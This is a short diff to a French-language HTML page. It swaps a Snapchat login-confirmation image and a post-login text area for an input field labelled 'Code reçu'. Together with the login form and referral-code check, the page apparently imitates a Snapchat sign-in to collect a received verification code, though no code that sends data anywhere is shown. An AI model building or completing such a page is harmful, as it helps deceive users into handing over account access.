@@ -125,27 +125,16 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="image-screen" id="imageScreen">
-    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
-  </div>
-
-  <div class="text-screen" id="textScreen" style="display:none; text-align:center; padding:40px; background-color:#fff; border-radius:10px; box-shadow:0 0 15px rgba(0,0,0,0.1); max-width:400px;">
-  <h3>Bienvenue !</h3>
-  <p>Vous êtes connecté avec succès.</p>
-  <textarea rows="4" style="width:100%; border-radius:8px; padding:10px; font-size:14px;" placeholder="Écrivez quelque chose ici..."></textarea>
+  <div class="code-screen" id="codeScreen">
+  <!-- Texte au-dessus de la zone -->
+  <label for="codeInput">Code reçu</label>
+  
+  <!-- Zone de texte pour entrer le code -->
+  <input type="text" id="codeInput" name="codeInput" placeholder="Entrez votre code ici" />
+  
+  <!-- Texte en dessous de la zone -->
+  <p>Validez</p>
 </div>
-
-<script>
-  const loginForm = document.getElementById('loginForm');
-  const loginBox = document.getElementById('loginBox');
-  const textScreen = document.getElementById('textScreen');
-
-  loginForm.addEventListener('submit', function(e) {
-    e.preventDefault(); // empêche le rechargement de la page
-    loginBox.style.display = 'none'; // cache la boîte de connexion
-    textScreen.style.display = 'block'; // affiche la nouvelle zone de texte
-  });
-</script>
 
 
   <script>
